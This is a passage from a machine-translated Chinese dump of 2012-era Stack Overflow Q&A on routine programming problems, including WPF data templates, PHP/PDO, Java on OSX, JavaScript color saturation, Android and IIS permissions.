{
    InitializeComponent();
    DataContext = new Dialog();
} 
```

逻辑流程是这样的：

1.  您的窗口已创建。
2.  在 DataContext 上设置 Dialog 控件的一个实例。
3.  ContentControl 上的绑定已更新
4.  搜索资源的默认[DataTemplateSelector](http://msdn.microsoft.com/en-us/library/system.windows.controls.datatemplateselector.aspx)设置为`ContentControl``DataTemplate``DataType``typeof(Dialog)`
5.  它在窗口的资源中找到这个 DataTemplate
6.  DataTemplate 的内容被[加载](http://msdn.microsoft.com/en-us/library/system.windows.frameworktemplate.loadcontent.aspx)并添加为`ContentControl`

任何时候`Content`发生`ContentControl`变化，都会重复相同的过程。因此，您可以拥有许多不同的模型，每个模型都有一个包含不同 UserControl 的不同 DataTemplate，并且每次更新 ContentControl 上的绑定时，您都会看到预期的视图。

使用 MVVM，您可以将 ViewModel 的属性绑定到该`Content`属性（称为 Current 或其他名称），然后根据 ViewModel 的当前状态将属性中的模型切换为预期值。请注意，在 ContentControl 中，对`Content`属性设置的任何内容都将成为`DataContext`ContentControl 的直接子项的 。类似于`ItemsSource`an`ItemsControl`中的`DataContext`each是`ItemTemplate`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-10T19:28:14.387

我在这里隐藏了很多关于 OK 和 Cancel 的 view-viewmodel 交互的细节，但是只要你有一个 DataTemplate 设置，那么这应该在窗口内呈现你的视图。

我在应用程序的资源字典中定义了我的 viewmodel-view 数据模板：

```
<DataTemplate DataType="{x:Type SaveDocumentChangesVM}">
    <SaveDocumentChangesView />
</DataTemplate> 
```

承载视图的窗口：

```
<Window x:Class="CustomDialogWindow" 
        SizeToContent="WidthAndHeight" ShowInTaskbar="False">
    <ContentPresenter Name="DialogContentPresenter" />
</Window> 
```

窗口的构造函数：

```
public CustomDialogWindow(object viewModel, string dialogTitle)
{
    InitializeComponent();

    // A datatemplate will allow WPF to figure out how to render the window contents
    DialogContentPresenter.Content = viewModel;

    if (dialogTitle != null)
    {
        Title = dialogTitle;
    }
} 
```

显示如下对话框：

```
var vm = new SaveDocumentChangesVM();
var dialog = new CustomDialogWindow(vm, "This is my dialog");
dialog.ShowDialog(); 
```

# twitter-bootstrap - PDO 语句的 JSON 输出到 Twitter 引导程序

> ID：13806475
> 
> 赞同：1
> 
> 时间：2012-12-10T17:58:42.050
> 
> 标签：twitter-bootstrap, pdo

我刚刚开始使用 PDO 方法查询数据库并且遇到了一些绊脚石。

我正在尝试做的事情：用一个简单查询的结果填充一个预先输入的字段。

查询数据库的代码：

```
$query = $db->prepare("SELECT `customers`.`Name` FROM `customers` WHERE       `customers`.`Name` LIKE :searchterm");

$searchterm = (isset($_POST['searchterm']) === true) ? $_POST['searchterm'] : '';

$query->bindValue(':searchterm', '%' . $searchterm . '%' );

$query->execute();

$rows=$query->fetchAll(PDO::FETCH_ASSOC);
echo(json_encode($rows)); 
```

用于预先输入的 Javascript：

```
 $('#customer-name').typeahead({
                source: function (query, process) {
                return $.post('ajax/get_customer_names.php', { searchterm: query }, function (data) {
                console.log(data);
                return process(data);
    });
}
}); 
```

现在我知道 typeahead 需要以下格式的字符串数组

```
{
"one": "Singular sensation",
"two": "Beady little eyes",
"three": "Little birds pitch by my doorstep"
} 
```

问题是我的代码目前通过发送到console.log以这种格式输出

```
[{"Name":"test"},{"Name":"Southern Testing"}] 
```

我整天都被这个问题困扰，我发现的例子都不合适。我假设我需要遍历 $rows 变量并提取字符串值，但不知道如何实现。任何人都可以让我知道我哪里出错并提供解决方案吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-17T21:46:16.490

可能也不是最优雅的解决方案，但我遇到了同样的问题，我在服务器端解决了这个问题：

```
$rows=$query->fetchAll(PDO::FETCH_ASSOC);
foreach ($rows as $r){
  $array[] = $k['Name'];
}
echo json_encode($array); 
```

这将格式化所有内容，以便提前输入。

# php - C# 中的 $item->children (http://......)

> ID：13806476
> 
> 赞同：0
> 
> 时间：2012-12-10T17:58:48.583
> 
> 标签：php, asp.net

我正在将 PHP Google 日历解析器转换为 .NET/C#。我对PHP不太熟悉；我无法理解这条线是如何工作的：

```
$gd = $item->children('http://schemas.google.com/g/2005') 
```

它是 foreach 循环的一部分：

```
$s = simplexml_load_file($feed); 

foreach ($s->entry as $item) {
    $gd = $item->children('http://schemas.google.com/g/2005');
    if ($gd->eventStatus->attributes()->value == $confirmed) {
?>
        <font size=+1><b>
            <?php print $item->title; ?>
        </b></font><br>.......... 
```

我的主要问题是 $item->children('http://schemas.google.com/g/2005') 是如何工作的？它对 URL 有什么作用？.Net 或 C# 中是否有等价物？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T18:04:01.873

我不认为 PHP 允许在索引器中使用字符串，因此您正在查看的内容类似于 C# 中的以下内容：

```
var SomeObject = SomeDictionary["http://schemas.google/com/g/2005"]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-10T18:05:15.297

它所做的是找到`<entry>`与特定命名空间匹配的子代。

例如：

```
<doc xmlns:bla="http://schemas.google.com/g/2005">
...
<entry>
    <bla:test>hello</bla:test>
    <otherstuff>you can't see me</otherstuff>
</entry> 
```

在您的代码示例中，它会将孩子与`hello`内容匹配。

这如何转化为 C#，我不确定 :)

# java - 在 OSX 上重新安装 Java 7 JDK

> ID：13806477
> 
> 赞同：12
> 
> 时间：2012-12-10T17:59:00.660
> 
> 标签：java, macos, installation

我尝试在 OSX 10.7.5 (Lion) 上安装 Java 7 (aka 1.7)。

不幸的是，这似乎把 Java 搞砸了，我不知道如何解决这个问题。目前，当我尝试运行 Eclipse 时，出现错误：

> JVM 共享库“/System/Library/Frameworks/JavaVM.framework”不包含 JNI_CreateJavaVM 符号。

诸如 Minecraft 和 PhpStorm 之类的程序将完全崩溃而没有错误。

在终端中运行'java -version'给了我：

```
java version "1.6.0_37"
Java(TM) SE Runtime Environment (build 1.6.0_37-b06-434-11M3909)
Java HotSpot(TM) 64-Bit Server VM (build 20.12-b01-434, mixed mode) 
```

我知道直接安装 Java 7 是可以预期的。不幸的是，实用程序 - > Java 首选项已在 OSX 10.7.5 中删除，并且尝试加载系统首选项 - > Java 窗格不起作用（它告诉我它会在新窗口中打开，但不会，当按钮似乎重新加载它时，单击它不会执行任何操作）。

我试过重新安装各种版本的 JRE 和 JDK 无济于事。

无论如何，是否有很多东西可以重新开始，还是我错过了一些非常明显的东西？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-25T23:15:44.433

找出 Java 7 的安装目录在 Mac OS X 上的位置。将 JAVA_HOME shell 变量设置为该目录（目录必须包含 a`bin`和`lib`子目录）。编辑路径`export PATH="${JAVA_HOME}/bin:${PATH}"`。再次尝试运行`java -version`。

如果一切都失败了，那么您可能需要重新安装操作系统才能恢复 Mac Java 默认设置并重新安装 Java 7。

我在 Mountain Lion (10.8) 上遇到了类似的问题：安装 Java 7 SDK 后，我删除了 Apple 默认的 Java 6 JRE。这搞砸了我的电脑，尤其是 Eclipse。该问题与 Apple 将官方 Java JRE 交付给 Mac OS X 的事实有关，直到 Java 7 出现并且 Oracle 成为该版本的官方供应商。重新安装操作系统后，我可以看到询问我下载 Java 运行时的提示窗口。这将重新安装 Apple Java 6 JRE。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-01-25T16:17:31.873

我遇到过同样的问题。尝试了几种解决方案，但最终从 Apple 的网站安装 Java for OSX 修复了它。

[http://support.apple.com/kb/DL1572?viewlocale=en_US](http://support.apple.com/kb/DL1572?viewlocale=en_US)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-11-08T04:29:08.777

对于遇到此问题的其他人，您可以尝试从 Apple 安装最新的 jdk：

[https://stackoverflow.com/a/26813731/1636818](https://stackoverflow.com/a/26813731/1636818)

# angularjs - AngularJS 中的这个属性是什么意思？

> ID：13806479
> 
> 赞同：-3
> 
> 时间：2012-12-10T17:59:10.003
> 
> 标签：angularjs

[我在一些AngularJS](http://en.wikipedia.org/wiki/AngularJS)代码中看到了一个 ui-select2 属性：

```
<select ui-select2 name="..." ng-model="..." ng-options="..."> 
```

这是什么意思？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T18:06:43.423

ui-select2 指令实际上不是 AngularJS 的一部分，它来自 AngularUI：

[http://angular-ui.github.com/#directives-select2](http://angular-ui.github.com/#directives-select2)。

正如您在链接中看到的，ui-select2 指令只是将 Select2 jQuery 插件与 AngularJS 集成的包装器。基本上，一个增强的组合框。

# javascript - 增加或减少色彩饱和度

> ID：13806483
> 
> 赞同：18
> 
> 时间：2012-12-10T17:59:39.967
> 
> 标签：javascript, algorithm, colors

我想知道增加或减少一种RGB颜色饱和度的算法

例如，如果我有颜色`rgb(200, 30, 40)`（红色），函数存根将是

```
function Saturation(color, factor)
where color.r = 200, color.g= 30 and color.b=40 
```

任何人都知道一个库或有一个代码片段可以做到这一点？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-12-10T19:05:27.293

根据巴厘岛巴洛的建议，我想出了：

```
RGBtoHSV= function(color) {
        var r,g,b,h,s,v;
        r= color[0];
        g= color[1];
        b= color[2];
        min = Math.min( r, g, b );
        max = Math.max( r, g, b );

        v = max;
        delta = max - min;
        if( max != 0 )
            s = delta / max;        // s
        else {
            // r = g = b = 0        // s = 0, v is undefined
            s = 0;
            h = -1;
            return [h, s, undefined];
        }
        if( r === max )
            h = ( g - b ) / delta;      // between yellow & magenta
        else if( g === max )
            h = 2 + ( b - r ) / delta;  // between cyan & yellow
        else
            h = 4 + ( r - g ) / delta;  // between magenta & cyan
        h *= 60;                // degrees
        if( h < 0 )
            h += 360;
        if ( isNaN(h) )
            h = 0;
        return [h,s,v];
    };

HSVtoRGB= function(color) {
        var i;
        var h,s,v,r,g,b;
        h= color[0];
        s= color[1];
        v= color[2];
        if(s === 0 ) {
            // achromatic (grey)
            r = g = b = v;
            return [r,g,b];
        }
        h /= 60;            // sector 0 to 5
        i = Math.floor( h );
        f = h - i;          // factorial part of h
        p = v * ( 1 - s );
        q = v * ( 1 - s * f );
        t = v * ( 1 - s * ( 1 - f ) );
        switch( i ) {
            case 0:
                r = v;
                g = t;
                b = p;
                break;
            case 1:
                r = q;
                g = v;
                b = p;
                break;
            case 2:
                r = p;
                g = v;
                b = t;
                break;
            case 3:
                r = p;
                g = q;
                b = v;
                break;
            case 4:
                r = t;
                g = p;
                b = v;
                break;
            default:        // case 5:
                r = v;
                g = p;
                b = q;
                break;
        }
        return [r,g,b];
    } 
```

通过转换为 HSV（色调、饱和度和值）格式，您可以通过以下方式手动更改 S 分量：

```
var hsv= RGBtoHSV ([200,100,100]);
alert(hsv)
hsv[1] *= 1.5;
alert(hsv)
var rgb= HSVtoRGB(hsv);
alert(rgb); //new color 
```

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2015-12-09T16:23:28.073

这是一种快速而肮脏的方式，可能在任何技术方面都不正确，但与转换为 HSV 并返回相比，它涉及的计算量更少（因此如果重要的话，渲染速度会更快）：

灰度相当于计算像素 RGB 部分的平均亮度。我们可以通过对灰色部分和彩色部分应用值加权来混合灰度：

```
var pixels = context.getImageData(0, 0, canvas.width, canvas.height);
grayscale = function (pixels, value) {
    var d = pixels.data;
    for (var i = 0; i < d.length; i += 4) {
        var r = d[i];
        var g = d[i + 1];
        var b = d[i + 2];
        var gray = 0.2989*r + 0.5870*g + 0.1140*b; //weights from CCIR 601 spec
        d[i] = gray * value + d[i] * (1-value);
        d[i+1] = gray * value + d[i+1] * (1-value);
        d[i+2] = gray * value + d[i+2] * (1-value);
    }
    return pixels;
}; 
```

因此，我们可以将其移除并将相关颜色重新添加到“饱和”中，而不是添加“灰度”：

```
saturate = function (pixels, value) {
    var d = pixels.data;
    for (var i = 0; i < d.length; i += 4) {
        var r = d[i]; 
        var g = d[i + 1];
        var b = d[i + 2];
        var gray = 0.2989*r + 0.5870*g + 0.1140*b; //weights from CCIR 601 spec
        d[i] = -gray * value + d[i] * (1+value);
        d[i+1] = -gray * value + d[i+1] * (1+value);
        d[i+2] = -gray * value + d[i+2] * (1+value);
        //normalize over- and under-saturated values
        if(d[i] > 255) d[i] = 255;
        if(d[i+1] > 255) d[i] = 255;
        if(d[i+2] > 255) d[i] = 255;
        if(d[i] < 0) d[i] = 0;
        if(d[i+1] < 0) d[i] = 0;
        if(d[i+2] < 0) d[i] = 0;
    }
    return pixels;
}; 
```

再次声明，这种“看起来”饱和但可能绝不符合“饱和”的技术定义（无论是什么）；我只是发布了这个，希望它对路人有帮助。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2015-07-28T11:52:50.827

// 我的解决方案是针对 HEX 格式的颜色。您可以按百分比请求饱和度。

```
function applySaturationToHexColor(hex, saturationPercent) {
    if (!/^#([0-9a-f]{6})$/i.test(hex)) {
        throw('Unexpected color format');
    }

    if (saturationPercent < 0 || saturationPercent > 100) {
        throw('Unexpected color format');
    }

    var saturationFloat   = saturationPercent / 100,
        rgbIntensityFloat = [
            parseInt(hex.substr(1,2), 16) / 255,
            parseInt(hex.substr(3,2), 16) / 255,
            parseInt(hex.substr(5,2), 16) / 255
        ];

    var rgbIntensityFloatSorted = rgbIntensityFloat.slice(0).sort(function(a, b){ return a - b; }),
        maxIntensityFloat       = rgbIntensityFloatSorted[2],
        mediumIntensityFloat    = rgbIntensityFloatSorted[1],
        minIntensityFloat       = rgbIntensityFloatSorted[0];

    if (maxIntensityFloat == minIntensityFloat) {
        // All colors have same intensity, which means 
        // the original color is gray, so we can't change saturation.
        return hex;
    }

    // New color max intensity wont change. Lets find medium and weak intensities.
    var newMediumIntensityFloat,
        newMinIntensityFloat = maxIntensityFloat * (1 - saturationFloat);

    if (mediumIntensityFloat == minIntensityFloat) {
        // Weak colors have equal intensity.
        newMediumIntensityFloat = newMinIntensityFloat;
    }
    else {
        // Calculate medium intensity with respect to original intensity proportion.
        var intensityProportion = (maxIntensityFloat - mediumIntensityFloat) / (mediumIntensityFloat - minIntensityFloat);
        newMediumIntensityFloat = (intensityProportion * newMinIntensityFloat + maxIntensityFloat) / (intensityProportion + 1);
    }

    var newRgbIntensityFloat       = [],
        newRgbIntensityFloatSorted = [newMinIntensityFloat, newMediumIntensityFloat, maxIntensityFloat];

    // We've found new intensities, but we have then sorted from min to max.
    // Now we have to restore original order.
    rgbIntensityFloat.forEach(function(originalRgb) {
        var rgbSortedIndex = rgbIntensityFloatSorted.indexOf(originalRgb);
        newRgbIntensityFloat.push(newRgbIntensityFloatSorted[rgbSortedIndex]);
    });

    var floatToHex = function(val) { return ('0' + Math.round(val * 255).toString(16)).substr(-2); },
        rgb2hex    = function(rgb) { return '#' + floatToHex(rgb[0]) + floatToHex(rgb[1]) + floatToHex(rgb[2]); };

    var newHex = rgb2hex(newRgbIntensityFloat);

    return newHex;
} 
```

# bash - 在变量中捕获标准输出并重定向标准错误

> ID：13806485
> 
> 赞同：0
> 
> 时间：2012-12-10T17:59:46.943
> 
> 标签：bash

这不起作用：

```
result=`./myscript.sh $@` 2> /dev/null 
```

`stderr`仍然出现在我的屏幕上。我猜作业的分组不正确，但我真的不知道如何同时执行这两项操作（特别是在不创建临时文件的情况下）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T18:03:09.363

您可以使用：

```
result=$(./myscript.sh "$@" 2> /dev/null) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-10T18:02:25.090

尝试：

```
result=`./myscript.sh $@ 2> /dev/null` 
```

# android - 在活动之间传递数据返回空字符串

> ID：13806487
> 
> 赞同：0
> 
> 时间：2012-12-10T17:59:51.640
> 
> 标签：android, string, android-intent, android-activity

在尝试将一些数据从一项活动传递到另一项活动时，我发现了一些问题。

我从这样的 EditText 获取数据：

```
et = (EditText)findViewById(R.id.et10);
id=et.getText().toString(); 
```

在第一个活动（TakeSomeData.class）中：

```
Intent i = new Intent(TakeSomeData.this, HttpExample.class);   
i.putExtra("STRING_I_NEED", id );
startActivity(i); 
```

在第二个活动（HttpExample.class）中：

```
Bundle extras = getIntent().getExtras();
newString = extras.getString("STRING_I_NEED"); 
```

然后我将此变量作为定义如下的方法的参数传递：

```
public String GetInternetData(String str) throws Exception {...} 
```

我这样称呼这个方法：

```
String returned = test.GetInternetData(newString); 
```

但最后，字符串似乎是空的。什么是我的错？

十分感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T18:04:30.860

如果您正在通过按钮单击或某些单击事件移动到另一个活动，那么您需要从该事件中的编辑文本中获取字符串值并使用意图传递该值

# llvm-3.0 - Function arg list LLVM opt pass 中的数组检测

> ID：13806488
> 
> 赞同：0
> 
> 时间：2012-12-10T17:59:53.247
> 
> 标签：llvm-3.0, llvm-ir

假设我有以下 LLVM IR

定义 void @foo(i32* %a, i32* %m) nounwind { ...

我通过为第一个 arg 传递一个数组并为 m 传递一个变量的地址来调用 foo。现在，我需要分析 foo 的 arg 列表并确定哪个 arg 传递了一个数组，而哪个只是一个指针地址。我知道两者实际上都是地址，但是 LLVM 是否提供某种元数据，以便我可以静态确定传入的类型。

注意：我正在写一个选择通行证

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-22T19:17:51.163

您可能可以改用“指向数组的指针”类型：

```
define void @foo([0 x i32]* %a, i32* %m) 
```

零大小的数组是完全有效的，llvm 文档说：

> 对超出静态类型隐含的数组末尾的索引没有限制

# javascript - 在 django-socketio 中获取用户

> ID：13806490
> 
> 赞同：4
> 
> 时间：2012-12-10T17:59:54.093
> 
> 标签：javascript, python, django, socket.io

一旦使用 django-socketio 通过 Socket.IO 连接从客户端 (JS) 到服务器 (django/python) 发送消息，是否可以确定在呈现页面时哪个用户通过了身份验证？

在这种情况下，视图由 django 提供，它需要身份验证——通常在我能够做到的服务器上`user = request.user`，但在`events.py`文件中`request.user`只返回一个`AnonymousUser`对象。这是有道理的，因为 websocket 服务器是一个与 django web 服务器完全不同的进程，因此用户没有在该套接字连接上进行身份验证。

我在想我必须想出一些巧妙的代码来将用户 ID 嵌入到发送到服务器的消息中，在这种情况下，我需要添加一些握手以确保最终用户无法欺骗它。

有没有人想出一个聪明的解决方案来解决这个问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T19:43:58.327

找到了我自己解决这个问题的方法。诀窍是在将`session_key`django`request`对象发送到服务器之前将其添加到 django-socketio 消息中；然后回到服务器端，您可以将其解析`session_key`为 User 对象。这是代码：

**模板文件：（**由 django 服务器提供）

```
<input type="hidden" id="session_key" value="{{ request.session.session_key }}">
...
<script type="text/javascript" charset="utf-8">
    function someHandler(action, post_id, some_val){
        var data = {
            'action': action,
            'post_id': post_id,
            'value': some_val,
            'session_key': $("#session_key").val()
        };
        socket.send(data);
    }
</script> 
```

**events.py：（**由 django-socketio 服务器处理）

```
from django.contrib.sessions.models import Session
from django.contrib.auth.models import User

def message(request, socket, context, message):
    session = Session.objects.get(session_key=message['session_key'])
    uid = session.get_decoded().get('_auth_user_id')
    user = User.objects.get(pk=uid) 
```

*利润！*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-09-07T08:28:25.240

为了避免 skandocious 在答案中出现额外的数据库命中，可以使用Django 的[缓存会话。](https://docs.djangoproject.com/en/1.8/topics/http/sessions/#using-cached-sessions)这涉及设置`memcached`和修改`SESSION_ENGINE`设置以使用您选择的缓存后端。

# asp.net - 由于权限不足，无法读取配置文件

> ID：13806492
> 
> 赞同：1
> 
> 时间：2012-12-10T18:00:00.753
> 
> 标签：asp.net, iis-8, windows-server-2012

因此，我查看了与此类似的问题，例如[此处](https://stackoverflow.com/questions/5615296/cannot-read-configuration-file-due-to-insufficient-permissions)。

我终其一生都无法弄清楚出了什么问题。我正在尝试设置一个 asp.net 网站。该网站存储在服务器的 D: 驱动器上。在 IIS8 (windows server 2012) 中，我指向 web.config 文件所在的 web 文件夹。我已授予 IIS_IUSRS 组对整个 D: 驱动器以及 IIS_IUSRS 组的一部分的 IUSR 和网络服务的读取权限。我不断收到错误。我将身份验证设置为基本身份验证。我已经重新启动了网站。我尝试了很多事情，但都陷入了僵局。这一切都在本地主机上。有没有人对为什么会发生这种情况有更多的想法？它可能是我的网络配置中的配置吗？该网站是从 IIS7 网站移植而来的。如果您需要我的 webconfig 中的详细信息，我可以告诉您其中很多包含敏感信息。

错误：

HTTP 错误 500.19 - 内部服务器错误

无法访问请求的页面，因为该页面的相关配置数据无效。

详细错误信息：

模块 IIS Web 核心

通知开始请求

处理程序尚未确定

错误代码 0x80070005

配置错误 由于权限不足，无法读取配置文件

配置文件 \?\D:\Applications\Portal\Portal.Web\web.config

请求的 URL 本地主机：80/门户

物理路径 D:\Applications\Portal\Portal.Web

登录方式尚未确定

登录用户尚未确定

请求跟踪目录 C:\inetpub\logs\FailedReqLogFiles

配置源：-1：0：

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T18:12:57.377

[1]。首先让它为匿名用户工作。然后收紧权限。

如果它不适用于匿名用户，请查找应用程序池的名称（在 IIS 中）。在 IIS 池中，查找运行应用程序池的标识。授予该帐户读取权限。

[2]。查看服务器日志（控制面板、管理工具、事件查看器、系统）以查看有关错误的更多信息。

此外，请记住，任何以非匿名用户身份对网站进行身份验证的人都需要（读取）网络内容的权限。您可以通过临时将“Everyone”组的读取权限授予 web.config（在文件系统级别）来测试/消除可能的问题。不要这样。只需使用这种方法来测试权限。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-03-26T17:21:28.130

您可以通过打开 IIS 管理器并检查应用程序池来查看网站正在运行的用户。单击站点正在使用的应用程序池，然后在“操作”窗格中选择“高级设置”。在身份下检查。如果它设置为 ApplicationPoolIdentity，则需要将其添加到 Web 根文件夹。您可以通过手动输入“IIS APPPOOL*apppoolname*”来添加它，其中 apppoolname 就是您最初选择的应用程序池的名称。输入名称后单击 CheckNames，它应该解析为应用程序池的名称，而没有前面的 iis apppool。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-03-27T15:47:12.933

There seem to be as many non-working answers to this issue as their are forums to post them on. IIS is just that difficult at times. So, if the above actions didn't work for you, following is a list commands that the government agency I work for tries to get their Server 2012 machines working. They said that some of them might fail, but just ignore those and go on.

In short, these commands unlock portions of the tiered configuration system, so that you can adjust them via your application's web.config file. Included are areas pertaining to compression, static content, Hope this helps!

**IMPORTANT:** Run the following commands individually in a command (DOS) window with administrator privileges (i.e. Right-click on *Command Prompt* and choose *Run as Administrator*).

%windir%\system32\inetsrv\appcmd unlock config -section:httpCompression

%windir%\system32\inetsrv\appcmd unlock config -section:staticContent

%windir%\system32\inetsrv\appcmd set config /section:urlCompression /doDynamicCompression:True

%windir%\system32\inetsrv\appcmd set config /section:urlCompression /doStaticCompression:True

%windir%\system32\inetsrv\appcmd set config /section:httpCompression /+staticTypes.[mimeType='text/*',enabled='true'] /commit:apphost

%windir%\system32\inetsrv\appcmd set config /section:httpCompression /+staticTypes.[mimeType='message/*',enabled='true'] /commit:apphost

%windir%\system32\inetsrv\appcmd set config /section:httpCompression /+staticTypes.[mimeType='image/*',enabled='true'] /commit:apphost

%windir%\system32\inetsrv\appcmd set config /section:httpCompression /+staticTypes.[mimeType='application/x-javascript',enabled='true'] /commit:apphost

%windir%\system32\inetsrv\appcmd set config /section:httpCompression /+staticTypes.[mimeType='application/javascript',enabled='true'] /commit:apphost

%systemroot%\system32\inetsrv\AppCmd unlock config /section:windowsAuthentication

%systemroot%\system32\inetsrv\AppCmd unlock config /section:anonymousAuthentication

# c# - 列表项未删除

> ID：13806495
> 
> 赞同：0
> 
> 时间：2012-12-10T18:00:05.447
> 
> 标签：c#, asp.net, listbox

我有 2 个按钮和一个`ListBox`. 当我单击第一个按钮时，它应该从中删除选定的项目，`ListBox`但它没有 -`ListBox`保持不变。代码有什么问题？

```
static List<string> Blist = new List<string>();
public int x;
protected void Page_Load(object sender, EventArgs e)
{
    Blist = (List<string>)Session["items"];

    if (Blist != null)
    {
        ListBox1.Items.Clear();
        for (int i = 0; i < Blist.Count; i++)
            ListBox1.Items.Add(Blist[i]);
    }
}

protected void Button1_Click(object sender, EventArgs e)
{
    x= ListBox1.SelectedIndex;

    if (x >= 0)
    {
        ListBox1.Items.RemoveAt(x);
        string m = Blist[x];
        Blist.Remove(m);

        Session["items"] = null;
        Session["items"] = Blist;
    }
}

protected void Button2_Click(object sender, EventArgs e)
{
    Session["items"] = null;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-10T18:12:32.563

当您的页面回发时（单击按钮时）Page_Load 处理程序再次触发。当它这样做时，它会重新填充您的列表。为防止这种情况发生，您需要检查它是回发页面还是初始加载。您可以通过检查`Page.IsPostBack`是真还是假来做到这一点。如果它为真，则意味着该页面正在被回发（通过按钮单击或其他方式）。如果它不是真的，则意味着它是页面的初始加载。

```
protected void Page_Load(object sender, EventArgs e)
{
      Blist = (List<string>)Session["items"];

      if (!Page.IsPostBack)
      {

         if (Blist != null)
         {
             ListBox1.Items.Clear();
             for (int i = 0; i < Blist.Count; i++)
                 ListBox1.Items.Add(Blist[i]);
         }
     }
 } 
```

# database - Blast+: blastdbcmd - 错误信息

> ID：13806498
> 
> 赞同：-2
> 
> 时间：2012-12-10T18:00:14.853
> 
> 标签：database, windows, blast

我想将 16S Microbial 数据库格式转换为 fasta 格式。我使用 Blast+ 程序（2.2.27+ 版本的 Window）。我可以安装这个程序，我知道我必须使用 blastdbcmd 命令。问题是我不知道如何正确编写命令，而且我有一条错误消息： **No alias or index file found nucleotide database 16SMicrobial in search path C:users\Debora\blast-2.2.27+ ; C:users\Debora\blast-2.2.27+\db\16SMicrobial**

16S 微生物文件在 db 文件中。16S 微生物已解压缩和解压缩。

我试图编辑环境变量，我打算编辑用户和系统变量，但我真的不明白我必须写什么。所以，我怀疑数据库在错误的地方，但我不知道如何更正。

我希望有人可以帮助我！！！！

谢谢大家！！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-02T23:18:53.973

发生的事情是您的 blastdbcmd 程序找不到您的 16s 数据库。您需要先将数据库设置为 .phr/.pin/.psq 或 .nhr/.nin/.nsq 文件。然后你必须确保你的程序知道去哪里找。最简单的方法是使用 .ncbirc 文件，该文件应与实际的 blastdbcmd 可执行文件位于同一目录中。在 Windows 上，我认为该文件是 .ncbi.ini，但我不确定。我也不知道格式，但你应该可以用谷歌搜索。为了让您在我的 mac 上有所了解，该文件包含该行`BLASTDB=/Users/myName/blast/db`，该目录是我存储数据库的位置。

# android - Android调试密钥？

> ID：13806500
> 
> 赞同：4
> 
> 时间：2012-12-10T18:00:22.643
> 
> 标签：android

尝试为使用 Maps 生成调试密钥。

我试过这个命令

```
keytool -list -alias androiddebugkey \
-keystore ~/.android/debug.keystore.keystore \
-storepass android -keypass android 
```

但我得到这个输出：

```
keytool error: java.lang.Exception: Keystore file does not exist: /Users/chance 1/.android/debug.keystore.keystore 
```

如何查找和生成？任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2016-01-27T07:11:27.923

您的命令有点错误，正确的命令是：

```
keytool -list -alias androiddebugkey -keystore ~/.android/debug.keystore -storepass android -keypass android 
```

（适用于 Linux/Mac - 在控制台输入，它将打印证书指纹 SHA1）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:10:24.720

我使用 XP，所以我通过打开命令提示符并键入以下内容导航到正确的目录： cd C:\Documents and Settings\HP_Administrator.android

一旦你导航到你的操作系统的正确目录，输入这个... keytool -list -alias androiddebugkey -storepass android -keypass android -key store debug.keystore

一旦你按下回车键，你会看到类似这样的内容（我们感兴趣的实际 MD5 是最后一行）：androiddebugkey, Mar 10, 2009, PrivateKeyEntry, Certificate finger (MD5): D1:16:4A :BD:73:73:A4:56:9D:CD:9A:44:A2:6C:11:AC

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T18:04:16.820

这是一个关于生成 Maps API 密钥的优秀教程。[https://developers.google.com/maps/documentation/android/v1/mapkey](https://developers.google.com/maps/documentation/android/v1/mapkey)

但对我来说，您的用户名中的空格似乎没有被正确转义。尝试输入 `keytool -list -alias androiddebugkey \ -keystore /Users/chance\ 1/.android/debug.keystore.keystore \ -storepass android -keypass android`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-04-15T11:08:20.817

我在cmd中的命令...

```
D:\Java_Install\jdk1.8.0_121\bin\keytool.exe -list -v -keystore "D:\UnityProjects\UnityMobileGameCreator\myapkkeystore.keystore" -storepass YOUR_KEY_STORE_PASS -keypass YOUR_KEY_PASS 
```

Unity 在发布设置中有两个密码框在上面的文本中使用这些密码，注意在统一的“播放器”对话框中发布设置中的“Keystore & Key”

替换密钥库的路径，输入密钥库密码，密钥密码，然后将文本粘贴到 cmd 并运行，您将在 cmd 窗口中获取密钥库数据。

# objective-c - 自定义 UIImageView 在 iOS 模拟器中工作，但在使用动画 segue 时在 iPad 上是黑色的

> ID：13806503
> 
> 赞同：1
> 
> 时间：2012-12-10T18:00:41.067
> 
> 标签：objective-c, uiimageview

我设计了一个显示平铺图案的自定义 UIImageView 类。该类旨在用于情节提要。该模式是使用 awakeFromNib 协议中的 CALayer 上的运行时参数构建的。

在我尝试使用动画转场之前，一切正常。它在模拟器上完美运行，但是当我在 iPad 上运行它时，图层是黑色的。如果我禁用动画一切正常。

有任何想法吗？

这是代码：

_hasRoundedCorners 和 _textureImage 是运行时参数

```
- (void) awakeFromNib {
    [super awakeFromNib];

    CALayer *textureLayer = [CALayer layer];
    [textureLayer setFrame:[self bounds]];
    if (_hasRoundedCorners) {
        [textureLayer setCornerRadius:6.0f];
    }
    UIColor *mycolor=[UIColor colorWithPatternImage:[UIImage imageNamed:_textureImage]];
    [textureLayer setBackgroundColor:mycolor.CGColor];
    [[self layer] addSublayer:textureLayer];
